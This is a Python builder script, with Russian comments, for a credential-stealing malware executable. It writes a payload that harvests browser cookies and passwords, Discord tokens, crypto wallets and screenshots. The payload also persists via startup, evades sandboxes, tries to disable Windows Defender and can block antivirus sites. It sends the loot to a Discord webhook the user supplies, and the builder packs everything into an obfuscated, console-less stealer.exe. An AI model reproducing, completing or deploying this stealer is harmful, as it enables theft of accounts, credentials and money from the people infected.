import os
import sys
import json
import shutil
import tempfile
import subprocess
from obfuscator import obfuscate_to_exe

def build_stealer(webhook_url, options=None, icon_path=None):
    """
    Собирает исполняемый файл стилера с указанными параметрами
    
    Args:
        webhook_url (str): URL Discord webhook для отправки данных
        options (dict): Опции для настройки стилера
        icon_path (str): Путь к файлу иконки
    
    Returns:
        str: Путь к созданному исполняемому файлу или None в случае ошибки
    """
    if options is None:
        options = {
            'collect_cookies': True,
            'collect_passwords': True,
            'collect_discord_tokens': True,
            'collect_crypto_wallets': True,
            'take_screenshot': True,
            'pack_to_zip': True,
            'anti_vm': True,
            'block_av_sites': False,
            'add_to_startup': True
        }
    
    # Создаем временную директорию для сборки
    build_dir = tempfile.mkdtemp()
    try:
        # Создаем main.py файл с нужными параметрами
        main_py_content = f"""
import os
import sys
import json
from client import main, collect_data, send_zip
from utils import block_sites, add_to_startup, is_sandboxed, disable_defender, create_mutex

# Проверка на единственный экземпляр
if not create_mutex():
    sys.exit(0)

# Параметры сборки
WEBHOOK_URL = "{webhook_url}"
COLLECT_COOKIES = {str(options.get('collect_cookies', True))}
COLLECT_PASSWORDS = {str(options.get('collect_passwords', True))}
COLLECT_DISCORD_TOKENS = {str(options.get('collect_discord_tokens', True))}
COLLECT_CRYPTO_WALLETS = {str(options.get('collect_crypto_wallets', True))}
TAKE_SCREENSHOT = {str(options.get('take_screenshot', True))}
PACK_TO_ZIP = {str(options.get('pack_to_zip', True))}
ANTI_VM = {str(options.get('anti_vm', True))}
BLOCK_AV_SITES = {str(options.get('block_av_sites', False))}
ADD_TO_STARTUP = {str(options.get('add_to_startup', True))}

def run():
    # Anti-VM проверка
    if ANTI_VM and is_sandboxed():
        sys.exit(0)
    
    # Добавление в автозапуск
    if ADD_TO_STARTUP:
        add_to_startup()
    
    # Блокировка антивирусных сайтов
    if BLOCK_AV_SITES:
        block_sites()
    
    # Отключение Defender (требует прав администратора)
    disable_defender()
    
    # Запуск основного функционала стилера
    main(WEBHOOK_URL)

if __name__ == "__main__":
    try:
        run()
    except Exception as e:
        # В случае ошибки пытаемся отправить отчет об ошибке
        try:
            import requests
            error_data = {{"error": str(e)}}
            requests.post(WEBHOOK_URL, json={{"content": f"Error: `{str(e)}`"}})
        except:
            pass
"""
        
        # Создаем и записываем main.py
        main_py_path = os.path.join(build_dir, "main.py")
        with open(main_py_path, "w") as f:
            f.write(main_py_content)
        
        # Копируем необходимые файлы
        for file in ["client.py", "utils.py"]:
            shutil.copy(file, build_dir)
        
        # Собираем исполняемый файл
        obfuscate_to_exe(main_py_path, icon_path, console=False)
        
        # Перемещаем результат в текущую директорию
        exe_path = os.path.join("dist", "stealer.exe")
        if os.path.exists(exe_path):
            new_path = os.path.join(os.getcwd(), "stealer.exe")
            shutil.copy(exe_path, new_path)
            return new_path
    
    except Exception as e:
        print(f"Ошибка при сборке: {e}")
    
    finally:
        # Удаляем временные файлы
        try:
            shutil.rmtree(build_dir)
            if os.path.exists("dist"):
                shutil.rmtree("dist")
            if os.path.exists("build"):
                shutil.rmtree("build")
            if os.path.exists("stealer.spec"):
                os.remove("stealer.spec")
        except:
            pass
    
    return None

def check_requirements():
    """Проверяет, установлены ли все необходимые зависимости"""
    required_modules = [
        "pyinstaller", "pillow", "requests", "cryptography", "pycryptodome", "pywin32", "psutil"
    ]
    
    missing = []
    for module in required_modules:
        try:
            __import__(module)
        except ImportError:
            missing.append(module)
    
    if missing:
        print("Отсутствуют следующие зависимости:")
        for module in missing:
            print(f" - {module}")
        
        install = input("Установить недостающие зависимости? (y/n): ")
        if install.lower() == 'y':
            for module in missing:
                subprocess.run([sys.executable, "-m", "pip", "install", module])
            return True
        else:
            return False
    
    return True

if __name__ == "__main__":
    if not check_requirements():
        print("Ошибка: не все зависимости установлены")
        sys.exit(1)
    
    webhook_url = input("Введите Discord webhook URL: ")
    icon_path = input("Путь к иконке (оставьте пустым для стандартной): ")
    
    if not icon_path or not os.path.exists(icon_path):
        icon_path = None
    
    print("Сборка исполняемого файла...")
    result = build_stealer(webhook_url, icon_path=icon_path)
    
    if result:
        print(f"Сборка успешно завершена. Исполняемый файл: {result}")
    else:
        print("Ошибка при сборке исполняемого файла")
